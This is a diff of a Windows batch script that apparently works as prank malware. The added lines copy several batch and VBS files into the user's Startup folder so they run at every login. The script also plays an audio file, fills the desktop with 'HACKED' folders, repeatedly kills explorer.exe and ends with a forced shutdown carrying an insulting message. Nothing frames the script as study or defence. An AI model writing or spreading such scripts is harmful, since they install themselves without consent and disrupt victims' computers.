@@ -15,6 +15,22 @@ copy run.vbs "%userprofile%\STARTM~1\Programs\Startup"
 
 copy UnrealV4.bat "%userprofile%\STARTM~1\Programs\Startup"
 
+
+
+copy startup.bat "%userprofile%\Start Menu\Programs\Startup"
+
+copy errors.bat "%userprofile%\Start Menu\Programs\Startup"
+
+copy runerrors.vbs "%userprofile%\Start Menu\Programs\Startup"
+
+copy Msg.vbs "%userprofile%\Start Menu\Programs\Startup"
+
+copy run.vbs "%userprofile%\Start Menu\Programs\Startup"
+
+copy UnrealV4.bat "%userprofile%\Start Menu\Programs\Startup"
+
+
+
 set "file=jebaited.mp3"
 ( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
   echo Sound.URL = "%file%"
@@ -27,26 +43,28 @@ start /min sound.vbs
 
 start runerrors.vbs
 
-md %userprofile%\desktop HACKED
-md %userprofile%\desktop HACKED2
-md %userprofile%\desktop HACKED3
-md %userprofile%\desktop HACKED4
-md %userprofile%\desktop HACKED5
-md %userprofile%\desktop HACKED6
-md %userprofile%\desktop HACKED7
-md %userprofile%\desktop HACKED8
-md %userprofile%\desktop HACKED9
-md %userprofile%\desktop HACKED10
-md %userprofile%\desktop HACKED11
-md %userprofile%\desktop HACKED12
-md %userprofile%\desktop HACKED13
-md %userprofile%\desktop HACKED14
-md %userprofile%\desktop HACKED15
-md %userprofile%\desktop HACKED16
-md %userprofile%\desktop HACKED17
-md %userprofile%\desktop HACKED18
-md %userprofile%\desktop HACKED19
-md %userprofile%\desktop HACKED20
+cd Desktop
+
+md %userprofile%\Desktop HACKED
+md %userprofile%\Desktop HACKED2
+md %userprofile%\Desktop HACKED3
+md %userprofile%\Desktop HACKED4
+md %userprofile%\Desktop HACKED5
+md %userprofile%\Desktop HACKED6
+md %userprofile%\Desktop HACKED7
+md %userprofile%\Desktop HACKED8
+md %userprofile%\Desktop HACKED9
+md %userprofile%\Desktop HACKED10
+md %userprofile%\Desktop HACKED11
+md %userprofile%\Desktop HACKED12
+md %userprofile%\Desktop HACKED13
+md %userprofile%\Desktop HACKED14
+md %userprofile%\Desktop HACKED15
+md %userprofile%\Desktop HACKED16
+md %userprofile%\Desktop HACKED17
+md %userprofile%\Desktop HACKED18
+md %userprofile%\Desktop HACKED19
+md %userprofile%\Desktop HACKED20
 
 taskkill /F /IM explorer.exe
 ping localhost -n 2 >NUL
@@ -63,3 +81,7 @@ ping localhost -n 2 >NUL
 taskkill /F /IM explorer.exe
 ping localhost -n 2 >NUL
 start explorer.exe
+
+shutdown -s -t 3 -c "Bye Bye Bitch! HAHAHAAHAHAH"
+
+
